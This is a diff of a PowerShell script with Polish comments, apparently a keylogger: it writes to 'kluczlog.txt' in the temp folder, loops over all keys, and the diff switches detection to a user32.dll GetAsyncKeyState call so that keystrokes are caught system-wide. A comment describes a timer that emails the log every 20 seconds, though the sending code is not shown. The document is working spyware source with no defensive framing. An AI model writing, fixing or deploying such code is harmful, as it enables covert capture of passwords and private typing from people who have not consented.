@@ -10,9 +10,15 @@ $logFile = "$env:TEMP\kluczlog.txt"
 # Tworzenie pustego pliku logów
 New-Item -Path $logFile -ItemType File -Force | Out-Null
 
-# Funkcja: Nasłuchiwanie klawiszy
-Add-Type -AssemblyName System.Windows.Forms
-$global:keys = ""
+# Dodanie typu do użycia user32.dll
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class Keyboard {
+    [DllImport("user32.dll")]
+    public static extern short GetAsyncKeyState(int vKey);
+}
+"@
 
 # Timer do wysyłania maila co 20 sekund
 $timer = New-Object Timers.Timer
@@ -39,8 +45,8 @@ $timer.Start()
 # Nasłuchiwanie w tle
 while ($true) {
     Start-Sleep -Milliseconds 100
-    foreach ($key in [System.Windows.Forms.Keys]::GetValues([System.Windows.Forms.Keys])) {
-        if ([System.Windows.Forms.Control]::ModifierKeys -eq $key -or [System.Windows.Forms.Keyboard]::IsKeyDown($key)) {
+    foreach ($key in [Enum]::GetValues([System.Windows.Forms.Keys])) {
+        if ([Keyboard]::GetAsyncKeyState([int]$key) -ne 0) {
             $keyName = $key.ToString()
             Add-Content -Path $logFile -Value $keyName
         }
